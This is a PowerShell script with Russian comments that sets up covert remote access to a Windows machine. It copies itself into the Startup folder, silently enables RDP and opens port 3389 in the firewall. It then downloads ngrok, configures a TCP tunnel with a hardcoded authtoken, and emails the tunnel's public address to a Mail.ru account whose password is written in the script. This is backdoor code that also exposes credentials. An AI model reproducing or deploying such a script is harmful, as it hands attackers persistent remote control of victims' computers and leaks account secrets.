Start-Sleep -Seconds 10  # Подождать появления сети

# Функция логирования
$logFile = "$env:TEMP\ngrok_log.txt"
function Log($msg) {
    "[$(Get-Date -Format s)] $msg" | Out-File -FilePath $logFile -Append
}

Log "=== Скрипт стартовал ==="

# Путь текущего скрипта
$thisScript = $MyInvocation.MyCommand.Path
Log "Текущий скрипт: $thisScript"

# Автозапуск
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ngrok.ps1"
if ($thisScript -ne $startupPath -and -not (Test-Path $startupPath)) {
    Copy-Item -Path $thisScript -Destination $startupPath -Force
    Log "Скрипт скопирован в автозагрузку"
    exit
}

# Включаем RDP
try {
    Start-Process reg.exe -ArgumentList 'add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' -Verb RunAs -WindowStyle Hidden | Out-Null
    Log "RDP включён"
} catch {
    Log "Ошибка при включении RDP: $_"
}

# Открываем порт 3389
try {
    Start-Process netsh -ArgumentList 'advfirewall firewall add rule name="ngrok RDP" dir=in action=allow protocol=TCP localport=3389' -WindowStyle Hidden | Out-Null
    Log "Firewall правило добавлено"
} catch {
    Log "Ошибка при добавлении правила брандмауэра: $_"
}

# Установка ngrok
$ngrokDir = "$env:APPDATA\ngrok"
$ngrokExe = Join-Path $ngrokDir "ngrok.exe"
$tempZip  = "$env:TEMP\ngrok.zip"

if (-not (Test-Path $ngrokExe)) {
    try {
        Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile $tempZip
        Expand-Archive -Path $tempZip -DestinationPath $ngrokDir -Force
        Log "Ngrok скачан и распакован"
    } catch {
        Log "Ошибка при загрузке ngrok: $_"
    }
} else {
    Log "Ngrok уже установлен"
}

# Конфиг ngrok (v2)
$ngrokConfigDir = "$env:USERPROFILE\.ngrok2"
$ngrokConfig    = Join-Path $ngrokConfigDir "ngrok.yml"

# Конфиг ngrok (v2) — без here-string
$ngrokConfigDir = "$env:USERPROFILE\.ngrok2"
$ngrokConfig    = Join-Path $ngrokConfigDir "ngrok.yml"

if (-not (Test-Path $ngrokConfig)) {
    try {
        # Создаём папку, если нужно
        if (-not (Test-Path $ngrokConfigDir)) {
            New-Item -Path $ngrokConfigDir -ItemType Directory | Out-Null
        }
        # Готовим содержимое конфига
        $lines = @(
            "authtoken: 2xe3OPcwxui4icUAn8vBgxysHzH_6ceP3DS71bZm5mRxktwua"
            "tunnels:"
            "  rdp:"
            "    addr: 3389"
            "    proto: tcp"
        )
        # Записываем в файл ASCII
        $lines | Out-File -FilePath $ngrokConfig -Encoding ASCII

        Log "Конфиг ngrok создан"
    } catch {
        Log "Ошибка при создании конфига ngrok: $_"
    }
}


# Получение публичного адреса
$tunnelAddress = $null
for ($i = 0; $i -lt 30; $i++) {
    try {
        $resp = Invoke-RestMethod -Uri "http://127.0.0.1:4040/api/tunnels" -TimeoutSec 2
        $t = $resp.tunnels | Where-Object { $_.proto -eq "tcp" }
        if ($t -and $t.public_url) {
            $tunnelAddress = $t.public_url
            Log "Получен tunnelAddress: $tunnelAddress"
            break
        }
    } catch {
        Start-Sleep -Seconds 1
    }
}
if (-not $tunnelAddress) {
    Log "Не удалось получить tunnelAddress"
}

# Параметры Mail.ru SMTP
$smtpServer = "smtp.mail.ru"
$smtpPort   = 587
$smtpUser   = "user.default00@mail.ru"
$smtpPass   = "DggLc7dSWENCbM56151O"

$from = $smtpUser
$to   = $smtpUser
$subj = "Ngrok RDP адрес"
if ($tunnelAddress) {
    $body = "Ngrok публичный TCP адрес:`n`t$tunnelAddress"
} else {
    $body = "Ngrok tunnel не был получен."
}

# Отправка письма
try {
    Log "Попытка отправки email"
    $securePass = ConvertTo-SecureString $smtpPass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($smtpUser, $securePass)
    Send-MailMessage -From $from -To $to -Subject $subj -Body $body `
        -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -ErrorAction Stop
    Log "Email успешно отправлен"
} catch {
    Log "Ошибка при отправке email: $_"
}

Log "=== Скрипт завершён ==="
